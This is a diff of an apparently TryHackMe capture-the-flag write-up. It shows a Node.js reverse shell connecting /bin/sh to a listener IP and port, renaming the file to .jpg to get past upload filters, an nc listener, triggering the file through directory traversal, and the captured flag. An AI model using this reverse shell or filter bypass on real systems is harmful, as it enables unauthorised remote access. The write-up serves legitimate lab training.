@@ -85,7 +85,7 @@ Interesting, the header `X-Powered-By: Express` suggests that the server uses `N
         cp = require("child_process"),
         sh = cp.spawn("/bin/sh", []);
     var client = new net.Socket();
-    client.connect(4242, "10.0.0.1", function(){
+    client.connect(4444, "10.10.241.182", function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
@@ -93,6 +93,16 @@ Interesting, the header `X-Powered-By: Express` suggests that the server uses `N
     return /a/; // Prevents the Node.js application from crashing
 })();
 ```
+Notice that I replaced the port field and IP-field appropriate to the machine who is going to be listening. In my case, it was the AttackBox machine.
+
 Now that the client-side filter is removed, we can try to upload our Node.js reverse shell. One can quickly see that the file is not accepted suggesting that there are server-side filters in place. Editing our reverse shell to have the name `reverse-shell.jpg` and uploading it however leads to an acceptance. Awesome!
+
+Remember the admin page? Well, we can leverage the directory-traversal vulnerability to get it to execute `reverse-shell.jpg`. We set-up a listener so:
+```console
+root@ip-10-10-241-182:~# nc -lvnp 4444
+```
+By typing in the field of the admin page with `../content/ALX.jpg`, we get a connection!!! Finally, `cat /var/www/flag.txt` gives us the flag `THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}`.
+
+
 
 
